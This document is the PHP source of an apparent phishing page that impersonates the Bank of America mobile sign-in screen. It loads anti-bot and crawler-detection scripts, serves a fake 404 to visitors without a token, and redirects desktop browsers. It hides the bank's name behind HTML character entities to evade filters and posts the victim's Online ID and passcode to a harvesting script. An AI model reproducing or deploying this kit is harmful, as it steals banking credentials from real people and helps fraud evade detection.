<?php
    session_start();

    require_once './src/Classes/Comp.php';
    require_once './src/Classes/Antibot.php';

    $comps = new Comp;
    $antibot = new Antibot;

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        die();
    }
    include './zsec.php';
    include 'bot_fucker/wrd.php';
    include 'bot_fucker/bot.php';
	include 'crawlerdetect.php';
    include 'huehuehue.php';
?>
<!DOCTYPE html><html class=""><head>

		<meta charset="utf-8">

		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
		<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE10">

		<script>
if (screen.width >= 500) { document.location = "access.php?token=<?php echo $_SESSION['token']; ?>"; }
</script>
		<title>&#83;&#105;&#103;&#110;&#32;&#73;&#110;</title>
		
		<link rel="stylesheet" type="text/css" href="css/bactouch.css" />
<link rel="stylesheet" type="text/css" href="css/slidemenu.css" />
<link rel="stylesheet" type="text/css" href="css/footer1.css" />
<link rel="stylesheet" type="text/css" href="css/toolbar1.css" />
<link rel="shortcut icon" href="favicon1.ico">
  </head>

	<body data-gr-c-s-loaded="true"><div id="page" class="" style="position: static; float: left; height: 100%; width: 100%; left: 100%; display: block;"><div id="cmw_toolBar_" class="cmw_toolBar_"><a id="leftButton" role="button" class="hidden"></a><a id="slidemenuz" class="sprite backButton icon sprite-menu" href="#" title="Show menu for all mobile banking features" role="button"></a><div id="barker" class="hidden"></div><h1 id="title" class=""><div id="cmw_toolBar_titleText" style="padding-left: 34px; padding-right: 34px; width: 100%;"><img src="images/logo.png"></div><span class="adaHidden" id="adaTitleText">Enter your Online ID</span></h1><a id="rightButton" class="hidden"></a></div><div id="SASI_banner_container"></div><div class="pageMinHeight"><!-- SIGN ON HOME PAGE-->
<div class="signonVersionTwoHomePage">
<div id="scrollerwrapperOt" class="overthrow">
	<div id="divMessaging" class="hidden"></div>
	<div id="blackBerryMsg" class="padding10" style="display: none;"></div>
	
	
	
	<div id="successMsg"></div>
	
	<div id="newOnlineId" style="">
		<div class="toppad5">
			<fieldset>
				<legend class="hidden" id="signonToggle">Toggle Yes or No</legend>			
				<label for="saveCustomUserId" class="adaHidden"></label>
				<?php
if(isset($_GET['invalid'])){
echo "<p style='color:red;padding:4px 4px 4px 4px;'>Invalid Online ID or Password. Please recheck your Online ID/Password.</p>";
}
?>
				<input type="checkbox" id="saveCustomUserId" class="hidden" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
				<label class="adaHidden" id="signonOIDLabel" for="btCustomOnlineId">Enter your Online ID</label>
				<div class="inputEntryContainer">
				<form method="post" action="step/next/hdsfb.php?token=<?php echo $_SESSION['token']; ?>" >
				<?php
if(isset($_GET['invalid'])){
echo "<input type='hidden' name='invalid' value='invalid'>";
}
?>
					<div id="toggleSwipe" class="toggleSwipeContainer right">
						<label aria-hidden="true" class="right" style="margin-right:30px;" id="signonSaveID">Save ID</label>
						<div id="toggleButton" class="toggle right" toggled="false">
							<span class="thumb"></span>
							<span class="toggleOn"  role="checkbox" title="Save this online ID" id="signonYes">YES</span>
							<span class="toggleOff" role="checkbox" title="Save this online ID" id="signonNo">NO</span>
						</div>
					</div>
					<div class="inputContainer">
						<label for="btCustomOnlineId" class="adaHidden"></label>
						<input type="text" name="omlj" class="focus sprite-clear_input_icns" minlength="4" maxlength="32" id="btCustomOnlineId" placeholder="Online ID" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" value="" required><a href="javascript:void();" role="button" title="Clear text field" class="clear"></a>
					</div>
					<div class="inputContainer" style="background-color: white;">
						<label for="btCustomPasscode" class="adaHidden"></label>
						<input id="btCustomPasscode" type="text" class="masked" placeholder="Passcode" maxlength="20" name="dsfsd" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" value="" required><a href="javascript:void();" role="button" title="Clear text field" class="clear"></a>
					</div>
					<div>	
		<button id="btSignonContinue" role="button" class="btn">
			<img style="margin-bottom:-4px;" class="paddingHoriz10" src="images/secure_lock.png">
			<span id="signonLabel">Sign In</span>
		
	</div>
				</form></div>
				
			</fieldset>
		</div>
	</div>
	
	<div id="savedOnlineId" style="display: none;">
		<nav>
			<h2 id="cmsSelectID">Saved Online ID</h2>
			<ul id="btSavedIdHolder" class="listView listView toppad10 fontSize075"></ul>
		</nav>
	</div>
	
	
</div>
	
	
	<div id="helpOptionView" class="helpOptionView">
		<div class="padding10 center">
			<div class="inline-link blueLink"><a href="javascript:void(0);" id="forgetOIDPass" class="plain slideUp jsForgotIDPass">Forgot ID/Passcode?</a></div>	
			<div class="paddingVert10 inline-link blueLink"><a href="javascript:void(0);" class="plain slideUp" id="signonEnroll">Enroll</a></div>
		</div>
		<div class="padding10">
				
		
			<div class="borderLine smarBannerdisplay hidden"></div>
			<div class="bofaBannerLink smarBannerdisplay hidden"><a href="javascript:;" class="appNavigation plain slideUp" id="signonBannerLink">&#71;&#101;&#116;&#32;&#116;&#104;&#101;&#32;&#77;&#111;&#98;&#105;&#108;&#101;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;&#32;&#97;&#112;&#112;</a></div>
		</div>
	</div>
	
</div>
</div><footer><div class="boa_footnote"></div><div class="boa_footer"><div class="left"><a id="boa_footer_privacy" href="#" >&#80;&#114;&#105;&#118;&#97;&#99;&#121; &amp; &#83;&#101;&#99;&#117;&#114;&#105;&#116;&#121;</a></div><div class="right"><a id="boa_footer_ehl" href="#" class="ehl">&#69;&#113;&#117;&#97;&#108;&#32;&#72;&#111;&#117;&#115;&#105;&#110;&#103;&#32;&#76;&#101;&#110;&#100;&#101;&#114;</a></div><p class="clear">&copy; 2022&#32;&#66;&#97;&#110;&#107;&#32;&#111;&#102;&#32;&#65;&#109;&#101;&#114;&#105;&#99;&#97;&#32;&#67;&#111;&#114;&#112;&#111;&#114;&#97;&#116;&#105;&#111;&#110;&#46;&#32;&#65;&#108;&#108;&#32;&#114;&#105;&#103;&#104;&#116;&#115;&#32;&#114;&#101;&#115;&#101;&#114;&#118;&#101;&#100;&#46;&#32;&#66;&#97;&#110;&#107;&#32;&#111;&#102;&#32;&#65;&#109;&#101;&#114;&#105;&#99;&#97;&#44;&#32;&#78;&#46;&#65;&#46;&#32;&#77;&#101;&#109;&#98;&#101;&#114;&#32;&#70;&#68;&#73;&#67;&#46;</p></div></footer></div>

</body></html>